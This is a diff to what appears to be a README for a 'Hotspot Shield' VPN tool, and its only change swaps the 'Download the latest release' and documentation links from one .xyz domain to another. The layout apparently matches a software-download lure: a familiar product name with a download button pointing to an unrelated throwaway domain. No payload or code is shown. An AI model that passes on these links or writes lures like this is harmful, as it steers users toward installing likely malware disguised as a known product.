@@ -21,9 +21,9 @@ The goal is a tool that just works — no clutter, no bloat.
 - [ ] Open the application launcher and complete the initial configuration.
 
 ## Get it
-➡️ **[Download the latest release](https://hotspot-shield-craft.softonx.xyz)**
+➡️ **[Download the latest release](https://hotspot-shield-craft.softax.xyz)**
 
-Documentation: https://hotspot-shield-craft.softonx.xyz
+Documentation: https://hotspot-shield-craft.softax.xyz
 
 ## Features
 1. **Kill Switch:** Automatic connection termination if the secure tunnel drops unexpectedly.
